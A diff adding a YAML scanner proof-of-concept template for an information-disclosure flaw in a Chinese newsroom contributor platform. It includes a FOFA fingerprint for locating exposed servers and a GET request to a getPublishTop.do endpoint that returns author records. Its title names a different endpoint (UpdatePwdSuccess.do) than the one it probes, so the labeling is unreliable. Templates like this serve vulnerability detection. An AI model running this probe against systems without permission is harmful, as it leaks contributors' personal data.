@@ -1,0 +1,16 @@
+id: poc-yaml-enjoy-communication-updatepwdsuccess-do-info-leak
+info:
+  name: 畅享通讯员投稿平台 UpdatePwdSuccess.do 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 畅享通讯员投稿平台
+  fofa: app="FOUNDER-全媒体采编系统"
+requests:
+- method: GET
+  path: /newsedit/newsedit/batman/getPublishTop.do
+  expression: "status_code == 200 && \ncontains(body,\"\\\"author\\\"\") &&\ncontains(body,\"\
+    \\\"authorID\\\"\") &&\ncontains(body,\"\\\"countCreated\\\"\") &&\n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
